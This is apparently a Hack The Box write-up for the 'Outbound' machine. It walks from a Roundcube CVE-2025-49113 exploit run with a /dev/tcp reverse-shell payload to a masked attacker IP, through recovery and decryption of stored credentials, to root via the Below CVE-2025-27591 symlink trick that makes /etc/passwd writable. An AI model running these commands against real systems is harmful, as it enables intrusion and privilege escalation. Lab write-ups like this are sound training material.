---
title: HTB Outbound - Writeup
date: 2025-08-07 10:00:00 +0330
categories: [Writeup]
tags: [cve]
description: My writeup of Outbound from Hack The Box 

---
![](assets/img/Outbound.png)

## - **Recon & Enum**
As always, starting with an Nmap scan.
```
$ nmap -sC -sV -oN outbound_nmap --min-rate=1000 mail.outbound.htb

Nmap scan report for mail.outbound.htb (10.10.11.77)
Host is up (0.29s latency).
rDNS record for 10.10.11.77: outbound.htb
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Roundcube Webmail :: Welcome to Roundcube Webmail
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```


HTB provided the following:
- `tyler` : `LhKL1o9Nm3X2`
After log in, we see Roundcube Webmail version 1.6.10 is installed which is vulnerable to CVE-2025-49113. so I used this php [POC](https://github.com/hakaioffsec/CVE-2025-49113-exploit) to get a shell.

## - **Foothold**

```
$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 '/bin/bash -c "/bin/sh -i >& /dev/tcp/*.*.*.*/8080 0>&1"'
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```


```
$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [*.*.*.*] from (UNKNOWN) [10.10.11.77] 37704
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -qc /bin/bash
www-data@mail:/$
```

Now we can switch user to tyler, and move laterally to get a user with sufficient privileges.  
From `/var/www/html/roundcube/config/config.inc.php` we learn some valuable info such as database credentials and a des key.  
When checking the `users` table, I got some hashes (supposedly) and in order to find the type (as they looked more like encoded strings) I checked the source codes and discovered thoses are just random strings.  
Looking again, we get a base64 encoded session identifier from the session table.  
Now we have DES3 encrypted hash for jacob, `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`

```
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

with the des key we got from the conf file, I decrypted the password using an online decryption tool.

- `jacob` : `595mO8DmwGeD`

```
tyler@mail:/$ su jacob
Password: 
jacob@mail:/$ id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob)
```

## - **User**

We still can't use SSH but now we can read `/var/mail/jacob`. there are two valuable information. first the new password for jacob (which will grant ssh to outbound.htb) and second, jacob has access to Below.  

```
$ ssh jacob@10.10.11.77      
jacob@10.10.11.77's password:
jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
jacob@outbound:~$
```

## - **Root**
Looking up Below (version 0.8.0 is installed), there is a privilege escalation vulnerability [CVE-2025-27591](https://github.com/rvizx/CVE-2025-27591)

```
jacob@outbound:~$ rm -f /var/log/below/error_root.log
jacob@outbound:~$ ln -s /etc/passwd /var/log/below/error_root.log
jacob@outbound:~$ sudo /usr/bin/below snapshot --begin now 2>/dev/null
Snapshot has been created at snapshot_01755001740_01755001740.qXLR1E
jacob@outbound:~$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1840 Jul 14 16:40 /etc/passwd
jacob@outbound:~$ echo 'my_root::0:0:root:/root:/bin/bash' >> /etc/passwd
jacob@outbound:~$ su my_root
root@outbound:/home/jacob# cd
root@outbound:~# id
uid=0(root) gid=0(root) groups=0(root)
root@outbound:~#
```


 
![](assets/img/outbound_pwn.png)